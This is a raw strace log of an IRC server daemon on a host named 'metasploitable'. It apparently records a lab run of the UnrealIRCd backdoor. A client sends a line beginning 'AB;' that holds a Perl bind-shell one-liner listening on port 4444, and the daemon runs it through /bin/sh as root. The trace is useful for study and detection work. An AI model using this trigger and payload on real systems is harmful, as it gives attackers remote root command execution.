4519  07:15:42.144591 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 800000})
4519  07:15:42.357444 clock_gettime(CLOCK_MONOTONIC, {1352, 174453553}) = 0
4519  07:15:42.357445 time(NULL)        = 1495624542
4519  07:15:42.357445 time(NULL)        = 1495624542
4519  07:15:42.357445 gettimeofday({1495624542, 357445}, NULL) = 0
4519  07:15:42.357445 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:15:42.357446 clock_gettime(CLOCK_MONOTONIC, {1352, 174454713}) = 0
4519  07:15:42.357446 gettimeofday({1495624542, 357446}, NULL) = 0
4519  07:15:42.357446 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:15:42.357470 clock_gettime(CLOCK_MONOTONIC, {1352, 174482843}) = 0
4519  07:15:42.357481 accept(2, 0, NULL) = 5
4519  07:15:42.357499 getpeername(5, {sa_family=AF_INET, sin_port=htons(35471), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:15:42.357530 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:15:42.357543 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:15:42.357556 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:15:42.357568 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:15:42.357579 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:15:42.357590 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:15:42.357604 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:15:42.357674 clock_gettime(CLOCK_MONOTONIC, {1352, 174688983}) = 0
4519  07:15:42.357704 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:15:42.357733 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:15:42.357743 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:15:42.357752 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:15:42.357762 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:15:42.357778 send(6, "$8\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:15:42.357859 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:15:42.357916 gettimeofday({1495624542, 357920}, NULL) = 0
4519  07:15:42.357927 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:15:42.360389 clock_gettime(CLOCK_MONOTONIC, {1352, 177406953}) = 0
4519  07:15:42.360407 recvfrom(6, "$8\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0{\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:15:42.360543 close(6)          = 0
4519  07:15:42.360574 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:15:42.360589 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:15:42.360680 time(NULL)        = 1495624542
4519  07:15:42.360723 time(NULL)        = 1495624542
4519  07:15:42.360735 gettimeofday({1495624542, 360739}, NULL) = 0
4519  07:15:42.360747 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:42.360776 clock_gettime(CLOCK_MONOTONIC, {1352, 177789520}) = 0
4519  07:15:42.360787 gettimeofday({1495624542, 360791}, NULL) = 0
4519  07:15:42.360853 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 580000})
4519  07:15:42.777448 clock_gettime(CLOCK_MONOTONIC, {1352, 594457303}) = 0
4519  07:15:42.777448 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:15:42.777449 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777449 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777449 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777461 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777475 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777498 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777512 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777525 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777539 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777552 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777566 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777579 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777592 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777606 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777619 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777632 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777646 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777659 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777673 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777686 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777713 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777755 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.777772 gettimeofday({1495624542, 777793}, NULL) = 0
4519  07:15:42.777801 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:15:42.777841 clock_gettime(CLOCK_MONOTONIC, {1352, 594854475}) = 0
4519  07:15:42.777853 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:15:42.777881 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:15:42.777900 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:15:42.777912 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:15:42.777927 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 6821
6821  07:15:42.777996 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
6821  07:15:42.778010 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
6821  07:15:42.778021 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6821  07:15:42.778034 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
6821  07:15:42.778137 brk(0)            = 0x80f9000
6821  07:15:42.778159 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6821  07:15:42.778175 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f92000
6821  07:15:42.778192 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
6821  07:15:42.778763 open("/etc/ld.so.cache", O_RDONLY) = 1
6821  07:15:42.778793 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6821  07:15:42.778811 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f8a000
6821  07:15:42.778822 close(1)          = 0
6821  07:15:42.778833 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6821  07:15:42.778848 open("/lib/libncurses.so.5", O_RDONLY) = 1
6821  07:15:42.778861 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
6821  07:15:42.778958 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
6821  07:15:42.778975 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f5a000
6821  07:15:42.778987 mmap2(0xb7f87000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f87000
6821  07:15:42.779005 close(1)          = 0
6821  07:15:42.779017 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6821  07:15:42.779031 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
6821  07:15:42.779045 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
6821  07:15:42.779132 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
6821  07:15:42.779149 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f56000
6821  07:15:42.779160 mmap2(0xb7f58000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f58000
6821  07:15:42.779176 close(1)          = 0
6821  07:15:42.779187 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6821  07:15:42.779214 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
6821  07:15:42.779257 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
6821  07:15:42.779384 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
6821  07:15:42.779400 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f55000
6821  07:15:42.779414 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e06000
6821  07:15:42.779425 mmap2(0xb7f4f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f4f000
6821  07:15:42.779440 mmap2(0xb7f52000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f52000
6821  07:15:42.779453 close(1)          = 0
6821  07:15:42.779475 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e05000
6821  07:15:42.779486 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e056b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
6821  07:15:42.779541 mprotect(0xb7f4f000, 4096, PROT_READ) = 0
6821  07:15:42.779576 munmap(0xb7f8a000, 29913) = 0
6821  07:15:42.779602 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6821  07:15:42.779615 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
6821  07:15:42.779635 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeda8a0) = -1 ENOTTY (Inappropriate ioctl for device)
6821  07:15:42.779664 brk(0)            = 0x80f9000
6821  07:15:42.779674 brk(0x80fa000)    = 0x80fa000
6821  07:15:42.779686 brk(0x80fb000)    = 0x80fb000
6821  07:15:42.779744 getuid32()        = 0
6821  07:15:42.779754 getgid32()        = 0
6821  07:15:42.779779 geteuid32()       = 0
6821  07:15:42.779805 getegid32()       = 0
6821  07:15:42.779818 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6821  07:15:42.779832 time(NULL)        = 1495624542
6821  07:15:42.779844 brk(0x80fc000)    = 0x80fc000
6821  07:15:42.779859 brk(0x80fd000)    = 0x80fd000
6821  07:15:42.779877 open("/proc/meminfo", O_RDONLY) = 1
6821  07:15:42.779898 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
6821  07:15:42.779916 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f91000
6821  07:15:42.779928 read(1, "MemTotal:      1035240 kB\nMemFree:        584652 kB\nBuffers:         64308 kB\nCached:         230004 kB\nSwapCached:          0 kB\nActive:         253304 kB\nInactive:       169932 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        584412 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5300 kB\nWriteback:           0 kB\nAnonPages:      128988 kB\nMapped:          52008 kB\nSlab:            16012 kB\nSReclaimable:     7904 kB\nSUnreclaim:       8108 kB\nPageTables:       1972 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
6821  07:15:42.780009 close(1)          = 0
6821  07:15:42.780020 munmap(0xb7f91000, 4096) = 0
6821  07:15:42.780031 brk(0x80fe000)    = 0x80fe000
6821  07:15:42.780057 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
6821  07:15:42.780070 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
6821  07:15:42.780082 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6821  07:15:42.780093 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6821  07:15:42.780105 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
6821  07:15:42.780117 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
6821  07:15:42.780130 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6821  07:15:42.780141 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6821  07:15:42.780154 uname({sys="Linux", node="metasploitable", ...}) = 0
6821  07:15:42.780253 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6821  07:15:42.780293 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6821  07:15:42.780312 brk(0x8100000)    = 0x8100000
6821  07:15:42.780324 getcwd("/etc/unreal", 4096) = 12
6821  07:15:42.780339 getpid()          = 6821
6821  07:15:42.780356 getppid()         = 4519
6821  07:15:42.780372 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6821  07:15:42.780406 stat64("/sbin/sh", 0xbfeda878) = -1 ENOENT (No such file or directory)
6821  07:15:42.780418 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
6821  07:15:42.780435 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
6821  07:15:42.780459 socket(PF_FILE, SOCK_STREAM, 0) = 1
6821  07:15:42.780472 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
6821  07:15:42.780484 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
6821  07:15:42.780506 close(1)          = 0
6821  07:15:42.780517 socket(PF_FILE, SOCK_STREAM, 0) = 1
6821  07:15:42.780527 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
6821  07:15:42.780537 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
6821  07:15:42.780554 close(1)          = 0
6821  07:15:42.780567 open("/etc/nsswitch.conf", O_RDONLY) = 1
6821  07:15:42.780581 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
6821  07:15:42.780597 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f91000
6821  07:15:42.780608 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
6821  07:15:42.780656 read(1, "", 4096) = 0
6821  07:15:42.780665 close(1)          = 0
6821  07:15:42.780674 munmap(0xb7f91000, 4096) = 0
6821  07:15:42.780702 open("/etc/ld.so.cache", O_RDONLY) = 1
6821  07:15:42.780743 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6821  07:15:42.780760 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f8a000
6821  07:15:42.780786 close(1)          = 0
6821  07:15:42.780797 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6821  07:15:42.780811 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
6821  07:15:42.780826 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
6821  07:15:42.780913 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
6821  07:15:42.780931 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dfc000
6821  07:15:42.780942 mmap2(0xb7e03000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7e03000
6821  07:15:42.780962 close(1)          = 0
6821  07:15:42.780974 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6821  07:15:42.780987 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
6821  07:15:42.781000 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
6821  07:15:42.781085 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
